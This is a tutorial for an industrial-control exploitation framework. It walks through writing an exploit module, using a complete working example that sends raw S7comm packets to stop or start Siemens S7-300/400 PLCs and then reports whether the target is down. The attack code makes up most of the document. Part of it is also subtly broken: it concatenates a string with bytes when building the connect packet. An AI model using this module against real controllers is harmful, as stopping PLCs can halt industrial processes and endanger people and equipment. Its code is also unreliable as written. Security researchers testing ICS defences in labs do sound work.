# how to create module

# create exploit module
We use s7_300_400_plc_control module as example.

## import 
```python
from icssploit import (
    exploits,       # exploit lib
    print_success,  # used to print success message
    print_status,   # used to print normal message
    print_error,    # used to print error message
    mute,           # used to mute function print to stdout
    validators,     # used to verify module options value
)

```
## Exploit class
### Define module base info
`__info__` used to define `show info` cmd output，this is the example.
```python
    __info__ = {
        'name': 'S7-300/400 PLC Control',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Use S7comm command to start/stop plc.',
        'references': [

        ],
        'devices': [
            'Siemens S7-300 and S7-400 programmable logic controllers (PLCs)',
        ],
    }
```
### Define options
We can use `exploits.Option` to Add expolit options，and `validators` to verify the options value.

common validators:
```python
validators.ipv4     # IPv4 Adress
validators.integer  # Int Value
validators.url      # url Address
validators.mac      # Mac Address
validators.boolify  # Boolean Value
```

Example:
```python
target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
port = exploits.Option(102, 'Target Port', validators=validators.integer)
slot = exploits.Option(2, 'CPU slot number.', validators=validators.integer)
command = exploits.Option(1, 'Command 0:start plc, 1:stop plc.', validators=validators.integer)
sock = None

```


### Exploit Functions

 * `check` - used to check target is vulnerable or not.
 * `run` - used to run module.
 * `exploit` - exploit codes.

You must implement `run` function at least.

### Exploit Example
```python
from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import socket
import time

setup_communication_payload = bytes.fromhex('0300001902f08032010000020000080000f0000002000201e0')
cpu_start_payload = bytes.fromhex("0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d")
cpu_stop_payload = bytes.fromhex("0300002102f0803201000006000010000029000000000009505f50524f4752414d")


class Exploit(exploits.Exploit):
    """
    Exploit implementation for siemens S7-300 and S7-400 PLCs Dos vulnerability.
    """
    __info__ = {
        'name': 'S7-300/400 PLC Control',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
        ],
        'description': 'Use S7comm command to start/stop plc.',
        'references': [

        ],
        'devices': [
            'Siemens S7-300 and S7-400 programmable logic controllers (PLCs)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(102, 'Target Port', validators=validators.integer)
    slot = exploits.Option(2, 'CPU slot number.', validators=validators.integer)
    command = exploits.Option(1, 'Command 0:start plc, 1:stop plc.', validators=validators.integer)
    sock = None

    def create_connect(self, slot):
        slot_num = chr(slot)
        create_connect_payload = bytes.fromhex('0300001611e00000001400c1020100c20201') + slot_num + bytes.fromhex('c0010a')
        self.sock.send(create_connect_payload)
        self.sock.recv(1024)
        self.sock.send(setup_communication_payload)
        self.sock.recv(1024)

    def exploit(self):
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        if self.command == 0:
            print_status("Start plc")
            self.sock.send(cpu_start_payload)
        elif self.command == 1:
            print_status("Stop plc")
            self.sock.send(cpu_stop_payload)
        else:
            print_error("Command %s didn't support" % self.command)

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target is down")
        else:
            print_error("Target is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True
```
